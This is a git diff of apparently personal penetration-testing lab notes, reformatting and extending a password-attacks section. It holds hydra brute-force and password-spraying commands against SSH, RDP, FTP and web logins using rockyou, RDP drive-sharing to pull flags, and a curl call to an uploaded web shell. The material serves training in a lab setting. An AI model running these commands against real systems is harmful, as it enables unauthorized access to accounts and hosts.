@@ -694,22 +694,22 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - [+] Exploit succeeded, shell can be found at: https://192.168.171.45/uploads/shell.php
   - `curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami`  
      
-### 15. Password attacks
- - attack network services login
-  - SSH
-    `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`  -l username, -p password wordlist, -s port  
-  - RDP (password spraying)
-    `echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt`: add users
-    `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`  
-  - HTTP POST login
-    `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` -l user, -P wordlist, http-post-form  
+### 15. Password attacks  
+- attack network services login  
+  - SSH  
+   `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`  -l username, -p password wordlist, -s port  
+  - RDP (password spraying)  
+   `echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt`: add users  
+   `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`  
+  - HTTP POST login  
+   `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` -l user, -P wordlist, http-post-form
 - password cracking
-  - 
-- password hashes
-  - NTLM
-  - NTLMv2
-  - relaying NTLMv2
-  - Windows credential guard
+  - dd 
+- password hashes  
+  - NTLM  
+  - NTLMv2  
+  - relaying NTLMv2  
+  - Windows credential guard  
 
 ### 16. Antivirus evasion  
 
@@ -1331,19 +1331,24 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - `python3 JAMESAdmin232_50347.py 192.168.170.52 192.168.45.165 443`  
 
 ### Password Attacks  
-- 16.1.1 SSH and RDP
-  **SSH** guess password
-  `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`  
-  `ssh -p 2222 george@192.168.157.201`  
-  **RDP** guess user and export flag to local
-  `hydra -L /usr/share/wordlists/test_small_credentials.txt -p "SuperS3cure1337#" rdp://192.168.160.202`
-  `mkdir -p ~/share`: create shared folder
-  `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.160.202 /cert:ignore /drive:share,/home/kali/share`: login to RDP and export flag to local
-  **ftp** guess password
-  `hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.160.202`
-  `ftp itadmin@192.168.160.202`
-  `get flag.txt`
+- 15.1 Attacking network services login  
+  - **SSH** guess password
+    `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`  
+    `ssh -p 2222 george@192.168.157.201`  
+  - **RDP** guess user and export flag to local
+    `hydra -L /usr/share/wordlists/test_small_credentials.txt -p "SuperS3cure1337#" rdp://192.168.160.202`
+    `mkdir -p ~/share`: create shared folder
+    `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.160.202 /cert:ignore /drive:share,/home/kali/share`: login to RDP and export flag to local
+  - **ftp** guess password
+    `hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.160.202`
+    `ftp itadmin@192.168.160.202`
+    `get flag.txt`
+  - HTTP POST Login Form
+    `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.157.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid username or password"`
+  - HTTP GET basic authen
+    `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.157.201 http-get /`
 - 16.1.2 HTTP POST Login Form
+  
   
 - 16.2.1
 
